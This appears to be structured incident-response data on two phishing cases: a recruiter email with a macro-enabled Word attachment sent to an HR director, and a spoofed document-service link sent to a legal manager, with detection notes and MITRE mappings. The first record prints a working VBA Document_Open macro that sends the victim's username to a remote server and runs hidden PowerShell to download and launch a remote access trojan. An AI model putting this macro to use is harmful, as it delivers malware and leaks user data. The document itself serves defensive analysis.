attachment_info.macro_code_snippet:
Sub Document_Open()
  Dim httpReq As Object
  Set httpReq = CreateObject("MSXML2.XMLHTTP")
  Dim targetURL As String
  targetURL = "https://update.trustedrecruiter.com/collect?user=" & Environ("USERNAME")
  httpReq.Open "POST", targetURL, False
  httpReq.Send
  Shell "powershell -windowstyle hidden -command Invoke-WebRequest -Uri http://malicious-downloads.example.net/rat.exe -OutFile $env:TEMP\rat.exe; Start-Process $env:TEMP\rat.exe", vbHide
End Sub
attachment_info.macro_behavior: Upon opening the Word document, the macro silently sends a POST request to a command and control server with the victim's username and downloads a remote access trojan executable to the victim's TEMP directory, then executes it to establish persistence and remote control.

technical_data.employee_communication_note: Human resources director received an unsolicited candidate profile with accurate job references and terminology. The email sender appeared legitimate but was not on the approved vendor list. The attachment triggered suspicion after IT awareness training about macro-enabled documents.

indicators.email_spoofing: From: recruitment@trustedrecruiter.com (spoofed, IP 203.0.113.77 not authorized in SPF record)

technical_data.detection_method: Email security gateway flagged the attachment due to macro content and sandbox analysis revealed network connection to external IPs. Network IDS detected suspicious POST request to unrecognized domain. User reported unexpected attachment leading to incident response.
relevant_mitre_techniques: T1071.001 - Application Layer Protocol: Web Protocols
T1059.001 - Command and Scripting Interpreter: PowerShell

technical_data.employee_communication_note: Legal manager received an unexpected email referencing a pending document with a personalized greeting and urgent tone. The embedded link pointed to a domain mimicking a known document management service but was unrecognized by IT. User reported suspicious nature after completing login unsuccessfully.

indicators.email_spoofing: From: legal.notifications@secure-docs.com (spoofed, IP 198.51.100.88 not authorized in SPF record)

technical_data.detection_method: Email security filters flagged the domain due to mismatch in SPF and DMARC policies. Network IDS detected outbound HTTPS requests to an unrecognized domain shortly after email receipt. User education prompted verification of unexpected links via separate channels. Incident response blocked domain and IP.
relevant_mitre_techniques: T1071.001 - Application Layer Protocol: Web Protocols
T1531 - Account Access Removal (post-compromise activity sometimes following credential theft)
